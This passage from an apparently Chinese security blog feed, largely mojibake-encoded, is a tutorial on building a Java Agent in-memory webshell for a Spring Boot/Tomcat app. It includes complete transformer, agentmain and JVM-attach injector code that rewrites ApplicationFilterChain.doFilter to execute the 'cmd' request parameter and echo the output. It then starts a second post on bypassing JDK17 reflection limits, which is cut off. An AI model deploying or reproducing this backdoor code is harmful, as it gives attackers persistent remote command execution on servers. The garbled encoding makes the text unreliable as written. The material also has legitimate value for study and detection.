Transform)ï¼Œç±»è½¬æ¢å…¶å®æœ€ç»ˆéƒ½å›å½’åˆ°ç±»é‡å®šä¹‰ <code>Instrumentation#redefineClasses</code> æ–¹æ³•ï¼Œæ­¤æ–¹æ³•æœ‰ä»¥ä¸‹é™åˆ¶ï¼š</p><ol><li>æ–°ç±»å’Œè€ç±»çš„çˆ¶ç±»å¿…é¡»ç›¸åŒ</li><li>æ–°ç±»å’Œè€ç±»å®ç°çš„æ¥å£æ•°ä¹Ÿè¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ç›¸åŒçš„æ¥å£</li><li>æ–°ç±»å’Œè€ç±»è®¿é—®ç¬¦å¿…é¡»ä¸€è‡´ã€‚ </li><li>æ–°ç±»å’Œè€ç±»å­—æ®µæ•°å’Œå­—æ®µåè¦ä¸€è‡´</li><li>æ–°ç±»å’Œè€ç±»æ–°å¢æˆ–åˆ é™¤çš„æ–¹æ³•å¿…é¡»æ˜¯ private static&#x2F;final ä¿®é¥°çš„</li><li>å¯ä»¥ä¿®æ”¹æ–¹æ³•ä½“</li></ol><h1 id="java-agentå®ç°spring-filterå†…å­˜é©¬"><a href="#Java-Agentå®ç°Spring-Filterå†…å­˜é©¬" class="headerlink" title="Java Agentå®ç°Spring Filterå†…å­˜é©¬"></a>Java Agentå®ç°Spring Filterå†…å­˜é©¬</h1><p>å› ä¸ºspringbootå†…ç½®äº†TomcatæœåŠ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°Filteré“¾ä¸­ä¸€å®šä¼šæ‰§è¡Œçš„æ–¹æ³•ï¼Œç„¶åé‡å†™ä»–å³å¯</p><p>ä»–çš„æµç¨‹ä¸ºApplicationFilterChain#doFilter&#x3D;&#x3D;ã€‹ApplicationFilterChain#internalDoFilter</p><p><img src="https://cdn.clown2024.cn/image-20241031170819582.png" alt="image-20241031170819582"></p><p><img src="https://cdn.clown2024.cn/image-20241031170835475.png" alt="image-20241031170835475"></p><p>è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½èƒ½å¤Ÿæ‹¿åˆ°ServletRequest å’Œ ServletResponseï¼Œè€Œä¸”hookä¸ä¼šå½±å“æ­£å¸¸ä¸šåŠ¡é€»è¾‘</p><p>æ‰€ä»¥æˆ‘ä»¬é‡å†™ApplicationFilterChain#internalDoFilteræˆ–è€…doFilteræ–¹æ³•æ¥æ‰“å…¥å†…å­˜é©¬å³å¯</p><h2 id="ç¼–å†™agentå†…å­˜é©¬"><a href="#ç¼–å†™agentå†…å­˜é©¬" class="headerlink" title="ç¼–å†™agentå†…å­˜é©¬"></a>ç¼–å†™agentå†…å­˜é©¬</h2><p>ç…§ä¾‹å…ˆå®ç°ä¸€ä¸ªClassFileTransformerï¼Œè¿™é‡Œçš„ServletRequestéœ€è¦æˆ‘ä»¬è‡ªå·±å»æºç çœ‹ä¸€ä¸‹å…·ä½“æ˜¯ä»€ä¹ˆç±»ï¼Œè¿™é‡Œæ˜¯jakarta.servlet.ServletRequest</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.ServletRequest request = $1\n;&quot;</span> + <span class="hljs-comment">//$1ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯requestè¯·æ±‚å®ä¾‹</span><br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>agentmain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//è·å–æ‰€æœ‰å·²åŠ è½½çš„ç±»</span><br>        <span class="hljs-comment">//è·å–ç›®æ ‡JVMåŠ è½½çš„å…¨éƒ¨ç±»</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;<br>                <span class="hljs-comment">//æ·»åŠ ä¸€ä¸ªtransformeråˆ°Instrumentationï¼Œå¹¶é‡æ–°è§¦å‘ç›®æ ‡ç±»åŠ è½½</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>MFæ–‡ä»¶å°±å’Œå‰é¢ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å†å†™å‡ºæ¥äº†</p><p>æœ€åæ˜¯Injectç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        System.out.println(list);<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºç›®æ ‡ç±»åˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.dev.DevApplication&quot;</span>)) &#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;æˆåŠŸæ’å…¥agent&quot;</span>);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå‘çš„ç‚¹ï¼Œå°±æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œæˆ‘ä»¬çš„javaagentçš„jaråŒ…å’Œinjectç±»éƒ½éœ€è¦æ˜¯ç¬¦åˆç›®æ ‡çš„jdkç‰ˆæœ¬çš„ï¼Œä¼°è®¡æ˜¯ä½ç‰ˆæœ¬ä¸èƒ½å‘é«˜ç‰ˆæœ¬æ³¨å…¥çš„é—®é¢˜</p><p>ç°åœ¨æˆ‘ä»¬å§springbootæœåŠ¡å¼€èµ·æ¥ï¼Œç„¶åå¯åŠ¨injectæ³¨å…¥agentå°±å¯ä»¥æ‰“å…¥å†…å­˜é©¬äº†</p><p><img src="https://cdn.clown2024.cn/image-20241031204330693.png" alt="image-20241031204330693"></p><p><img src="https://cdn.clown2024.cn/image-20241031204345365.png" alt="image-20241031204345365"></p><p>æˆ‘çœ‹æœ‰äº›æ–‡ç« å¯ä»¥å°†injectç±»å†™æˆjaråŒ…ï¼Œä¼ å…¥vmçš„pidå’Œagentçš„jaråŒ…å‚æ•°å°±èƒ½å‘½ä»¤è¡Œæ‰§è¡Œäº†ï¼Œä¸è¿‡éœ€è¦ç›¸å…³çš„å†…å­˜å·¥å…·æ¥è·å–pidæ‰è¡Œã€‚</p><h2 id="agentå†…å­˜é©¬å›æ˜¾é—®é¢˜"><a href="#agentå†…å­˜é©¬å›æ˜¾é—®é¢˜" class="headerlink" title="agentå†…å­˜é©¬å›æ˜¾é—®é¢˜"></a>agentå†…å­˜é©¬å›æ˜¾é—®é¢˜</h2><p>è¿™é‡Œçš„ç®€å•å†…å­˜é©¬ä¸å¸¦å›æ˜¾æ„Ÿè§‰ä¸æ–¹ä¾¿ï¼Œæˆ‘åˆå»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æœ‰å›æ˜¾çš„å†™æ³•ï¼ŒClassFileTransformerå°±å¯ä»¥æ”¹æˆä¸‹é¢è¿™æ ·</p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/">https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;internalDoFilter&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“,å¸¦å›æ˜¾</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = $2.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;else&#123;internalDoFilter($1,$2);&#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<span class="hljs-comment">//åœ¨æ–¹æ³•å‰æ’å…¥ä»£ç </span><br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.detach();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>emmmä½†æ˜¯æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œä»–æ¯æ¬¡è¯·æ±‚å®Œå°±ä¼šå¡ä½ï¼Œç„¶åå°±æŠ¥ä¸‹é¢çš„é”™è¯¯ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241031215713085.png" alt="image-20241031215713085"></p><p>æ„æ€æ˜¯JVMåœ¨è¿è¡Œçš„æ—¶å€™æ‰¾ä¸åˆ°ç±»çš„å®šä¹‰ï¼Œè¿™å°±å¾ˆå¥‡æ€ªäº†ï¼Œç„¶åè¯•äº†å¾ˆå¤šå…¶ä»–çš„æ“ä½œå‘ç°éƒ½æ˜¯æŠ¥è¿™ä¸ªé”™è¯¯ï¼Œåªæœ‰å‰é¢é‚£ä¸ªç®€å•çš„å†…å­˜é©¬èƒ½é€šï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>æˆ‘ç›´æ¥copyäº†ä»–çš„æ•´ä¸ªdoFilteræ–¹æ³•ä¹Ÿä¸è¡Œçº¢æ¸©äº†ğŸ˜¡</p><p>fuckæˆ‘æ”¹äº†ä¸€æ™šä¸Šç»ˆäºè¡Œäº†ï¼Œè¿™æ˜¯æˆåŠŸçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>            String body=<span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletRequest req = $1;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletResponse res = $2;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;try &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=req.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = res.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;internalDoFilter(req, res);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;return null;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125; catch (java.lang.Exception pe) &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœåªéœ€è¦æ¯”å‰é¢é‚£ä¸ªå¤šä¸€æ®µ**internalDoFilter(req, res);**æ–¹æ³•çš„è°ƒç”¨å°±å¯ä»¥äº†ï¼Œæˆ‘ä¼°è®¡æ˜¯ä¸è°ƒç”¨è¯¥æ–¹æ³•è°ƒç”¨é“¾å°±ä¼šç›´æ¥æ–­æ‰ï¼Œå¯¼è‡´æˆ‘å‘è¯·æ±‚å°±å¡åœ¨é‚£é‡Œä¸åŠ¨</p><p><img src="https://cdn.clown2024.cn/image-20241031231112320.png" alt="image-20241031231112320"></p><p>è€Œä¸”è¿™ç§æ–¹æ³•å†™å¦‚æœå¼¹è®¡ç®—å™¨çš„è¯ä»–ä¼šå¼¹äº”æ¬¡ï¼Œè¯´æ˜ä»–è°ƒç”¨é“¾ä¸­èµ°äº†äº”æ¬¡doFilteræ–¹æ³•</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&u_asig=1a0c384b17302758676971458e00f7&time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt+teD">https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&amp;u_asig=1a0c384b17302758676971458e00f7&amp;time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt%2BteD</a></p><p><a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> å†…å­˜é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK17åå°„é™åˆ¶ç»•è¿‡å­¦ä¹ </title>
      <link href="/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="jdk17åå°„é™åˆ¶"><a href="#JDK17åå°„é™åˆ¶" class="headerlink" title="JDK17åå°„é™åˆ¶"></a>JDK17åå°„é™åˆ¶</h1><p>åœ¨JDK9è‡³JDK16ç‰ˆæœ¬ä¹‹ä¸­ï¼ŒJava.*ä¾èµ–åŒ…ä¸‹æ‰€æœ‰çš„éå…¬å…±å­—æ®µå’Œæ–¹æ³•åœ¨è¿›è¡Œåå°„è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šå‡ºç°å…³äºéæ³•åå°„è®¿é—®çš„è­¦å‘Šï¼Œä½†æ˜¯åœ¨JDK17ä¹‹åï¼Œé‡‡ç”¨çš„æ˜¯å¼ºå°è£…ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸å†å…è®¸è¿™ä¸€ç±»çš„åå°„ï¼Œæ‰€æœ‰åå°„è®¿é—®<strong>java.*çš„éå…¬å…±å­—æ®µå’Œæ–¹æ³•</strong>çš„ä»£ç å°†æŠ›å‡ºInaccessibleObjectExceptionå¼‚å¸¸</p><p>æ¯”å¦‚ä¸‹é¢è·å–ClassLoaderçš„protectedçš„defineClassæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼šæŠ¥è¿™æ ·çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/image-20241030111739224.png" alt="image-20241030111739224"></p><h2 id="jdkæ¨¡å—åŒ–é™åˆ¶"><a href="#JDKæ¨¡å—åŒ–é™åˆ¶" class="headerlink" title="JDKæ¨¡å—åŒ–é™åˆ¶"></a>JDKæ¨¡å—åŒ–é™åˆ¶</h2><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·è¢«é™åˆ¶å‘¢ï¼Œè¿™æ˜¯ç”±äºåœ¨JDK9ä¹‹åå¼•å…¥çš„æ¨¡å—åŒ–æœºåˆ¶ï¼ŒæŒ‡Javaå¹³å°æ¨¡å—ç³»ç»Ÿï¼ˆJava Platform Module Systemï¼Œç®€ç§°JPMSï¼‰</p><p>æ¨¡å—åŒ–æœºåˆ¶çš„ä¸€äº›å…³é”®æ¦‚å¿µ(ç”±kimiç”Ÿæˆ)ï¼š</p><ul><li><strong>æ¨¡å—ï¼ˆModuleï¼‰</strong>ï¼šä¸€ä¸ªæ¨¡å—æ˜¯ä¸€ç»„ç›¸å…³çš„åŒ…çš„é›†åˆï¼Œè¿™äº›åŒ…ä¸€èµ·æä¾›ç‰¹å®šçš„åŠŸèƒ½ã€‚</li><li><strong>æ¨¡å—åŒ–è·¯å¾„ï¼ˆModule Pathï¼‰</strong>ï¼šæ¨¡å—åŒ–è·¯å¾„æ˜¯ç±»è·¯å¾„çš„æ›¿ä»£å“ï¼Œç”¨äºæŒ‡å®šæ¨¡å—çš„ä½ç½®ã€‚</li><li><strong>æ¨¡å—æè¿°ç¬¦ï¼ˆModule 